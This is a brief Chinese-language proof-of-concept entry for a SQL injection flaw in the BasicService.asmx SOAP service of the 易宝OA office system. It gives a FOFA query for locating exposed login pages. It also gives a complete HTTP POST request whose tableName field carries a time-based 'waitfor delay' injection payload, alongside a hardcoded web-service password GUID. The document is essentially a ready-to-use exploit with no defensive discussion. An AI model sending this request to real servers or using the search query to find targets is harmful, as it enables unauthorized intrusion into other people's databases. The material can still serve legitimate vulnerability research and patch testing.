## 易宝OA-BasicService.asmx存在SQL注入漏洞


## fofa

```yaml
title="欢迎登录易宝OA系统"
```

## poc

```java
POST /WebService/BasicService.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
Content-Type: application/x-www-form-urlencoded
SOAPAction: "http://tempuri.org/GetStreamID"
Content-Length: 85

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetStreamID xmlns="http://tempuri.org/">
<tableName>';waitfor delay '0:0:6'--+</tableName>
<webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
</GetStreamID>
</soap:Body>
</soap:Envelope>
```

